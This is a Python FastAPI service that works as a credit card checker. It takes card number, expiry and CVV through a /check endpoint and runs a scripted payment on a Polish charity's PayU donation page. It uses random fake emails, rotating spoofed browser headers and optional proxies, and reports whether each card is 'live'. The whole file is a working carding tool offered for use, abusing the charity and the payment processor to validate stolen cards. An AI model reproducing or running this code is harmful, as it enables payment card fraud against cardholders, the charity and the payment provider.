from fastapi import FastAPI, Query, HTTPException
from fastapi.middleware.cors import CORSMiddleware
import re
import json
import time
import random
import string
import requests

app = FastAPI()

# Allow semua domain akses API ni
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

def _random_email():
    chars = string.ascii_lowercase + string.digits
    user = ''.join(random.choices(chars, k=10))
    return f"{user}@gmail.com"

def _random_ua():
    versions = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36 Edg/137.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    ]
    return random.choice(versions)

def _poll_status(session, order_id, token, ua, max_attempts=10, delay=3):
    headers = {
        'accept': '*/*',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': f'Bearer {token}',
        'priority': 'u=1, i',
        'referer': f'https://secure.payu.com/pay/?orderId={order_id}&token={token}',
        'sec-ch-ua': '"Mises";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Linux"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': ua,
    }

    data = {}
    for i in range(max_attempts):
        time.sleep(delay)
        r = session.get(f'https://secure.payu.com/api/front/orders/{order_id}/status', headers=headers, timeout=30)

        try:
            data = r.json()
        except Exception:
            try:
                data = json.loads(r.text)
            except Exception:
                data = {"raw": r.text, "status_code": r.status_code}

        category = data.get('category')
        if category not in ('IN_PROGRESS', 'NEW'):
            return data

        if i == max_attempts - 1:
            return data

    return data

def _payu_sync(cc, mm, yy, cvv_code, proxy_str=None):
    """Synchronous PayU charge check via fundacjakukuczki.pl donation page"""
    session = requests.Session()
    try:
        email = _random_email()
        ua = _random_ua()
        name = "Python Shelby"

        if proxy_str:
            session.proxies = {
                'http': proxy_str,
                'https': proxy_str,
            }

        if len(yy) == 2:
            yy = '20' + yy

        # ─── Step 1: Create donation order ───
        headers1 = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://fundacjakukuczki.pl',
            'referer': 'https://fundacjakukuczki.pl/en/donations/payu/',
            'sec-ch-ua': '"Mises";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': ua,
        }

        data1 = {
            'name': name,
            'email': email,
            'amount': '1',
            'purpose': 'Pomoc Dariuszowi Glince',
        }

        r1 = session.post('https://fundacjakukuczki.pl/payu-darowizna.php', headers=headers1, data=data1, allow_redirects=False, timeout=30)

        order_id = None
        token = None

        if 'Location' in r1.headers:
            loc = r1.headers['Location']
            oid = re.search(r'orderId=([^&]+)', loc)
            tok = re.search(r'token=([^&]+)', loc)
            if oid:
                order_id = oid.group(1)
            if tok:
                token = tok.group(1)

        if not order_id or not token:
            body = r1.text
            oid = re.search(r'orderId["\']?\s*[:=]\s*["\']?([^"&\s\'>]+)', body)
            tok = re.search(r'token["\']?\s*[:=]\s*["\']?([^"&\s\'>]+)', body)
            if oid and not order_id:
                order_id = oid.group(1)
            if tok and not token:
                token = tok.group(1)

        if not order_id or not token:
            return 'Failed to extract orderId or token'

        # ─── Step 2: Load PayU pay page ───
        params2 = {
            'orderId': order_id,
            'token': token,
        }

        headers2 = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'max-age=0',
            'priority': 'u=0, i',
            'referer': 'https://fundacjakukuczki.pl/',
            'sec-ch-ua': '"Mises";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'cross-site',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': ua,
        }

        session.get('https://secure.payu.com/pay/', params=params2, headers=headers2, timeout=30)

        # ─── Step 3: Tokenize card ───
        headers3 = {
            'accept': '*/*',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'authorization': f'Bearer {token}',
            'content-type': 'application/json',
            'origin': 'https://secure.payu.com',
            'priority': 'u=1, i',
            'referer': f'https://secure.payu.com/pay/?orderId={order_id}&token={token}',
            'sec-ch-ua': '"Mises";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': ua,
        }

        json3 = {
            'posId': 'PAYU S.A.',
            'type': 'SINGLE',
            'card': {
                'number': cc,
                'cvv': cvv_code,
                'expirationMonth': mm,
                'expirationYear': yy,
            },
        }

        r3 = session.post('https://secure.payu.com/api/front/tokens', headers=headers3, json=json3, timeout=30)

        try:
            token_data = r3.json()
        except Exception:
            try:
                token_data = json.loads(r3.text)
            except Exception:
                token_data = {"raw": r3.text, "status_code": r3.status_code}

        card_token = token_data.get('value')

        if not card_token:
            error_msg = token_data.get('error', {}).get('message', '') if isinstance(token_data.get('error'), dict) else str(token_data.get('error', ''))
            if error_msg:
                return f'Tokenization failed: {error_msg}'
            return f'Failed to tokenize card'

        # ─── Step 4: Submit payment ───
        masked = cc[:6] + '*' * 6 + cc[-4:]

        json4 = {
            'email': email,
            'firstName': name.split()[0] if ' ' in name else name,
            'lastName': name.split()[1] if ' ' in name else '',
            'currency': 'USD',
            'amount': 28,
            'payMethod': {
                'type': 'c',
                'token': card_token,
                'cardDetails': {
                    'maskedCardNumber': masked,
                },
            },
            'metadata': {
                'cardInputTime': 9039,
            },
            'redirectUrl': f'https://secure.payu.com/pay/?orderId={order_id}&token=%token%',
            'mcpFxTableId': 588817,
            'mcpFxRate': 3.5229,
            'browserData': {
                'screenWidth': 800,
                'javaEnabled': False,
                'timezoneOffset': -330,
                'screenHeight': 1280,
                'userAgent': ua,
                'colorDepth': 24,
                'language': 'en-IN',
                'challengeWindowSize': '04',
            },
            'language': 'en',
            'invoice': None,
        }

        r4 = session.post(f'https://secure.payu.com/api/front/orders/{order_id}/payments', headers=headers3, json=json4, timeout=30)

        try:
            pay_data = r4.json()
        except Exception:
            try:
                pay_data = json.loads(r4.text)
            except Exception:
                pay_data = {"raw": r4.text, "status_code": r4.status_code}

        continue_url = pay_data.get('continueUrl')
        error_code = pay_data.get('errorCode')

        if error_code:
            return f'Payment error: {error_code}'

        # ─── Step 5: Poll for result ───
        if continue_url and 'threeds' in continue_url:
            final_status = _poll_status(session, order_id, token, ua, max_attempts=10, delay=3)
        else:
            final_status = _poll_status(session, order_id, token, ua, max_attempts=3, delay=2)

        category = final_status.get('category', '')
        value = final_status.get('value', '')

        if category == 'SUCCESS':
            return 'Payment Successful'
        elif category == 'ERROR':
            return f'Payment declined: {value}'
        elif category in ('WARNING_CONTINUE_3DS', 'IN_PROGRESS'):
            return '3DS Required (Card Live)'
        else:
            return f'{category}: {value}' if category else f'Unknown: {value}'

    except requests.exceptions.Timeout:
        return 'Timeout from Payment Gateway'
    except Exception as e:
        return f'Error: {str(e)}'
    finally:
        session.close()

@app.get("/check")
def check_card(cc: str = Query(...)):
    parts = cc.split('|')
    if len(parts) != 4:
        raise HTTPException(status_code=400, detail="Invalid format. Use: cc|mm|yy|cvv")
    
    card_num, mm, yy, cvv_code = parts
    mm = mm.zfill(2)
    if len(yy) == 2:
        yy = '20' + yy
        
    try:
        result = _payu_sync(card_num, mm, yy, cvv_code)
    except Exception as e:
        result = f"Process crashed: {str(e)}"
        
    return {"message": result}
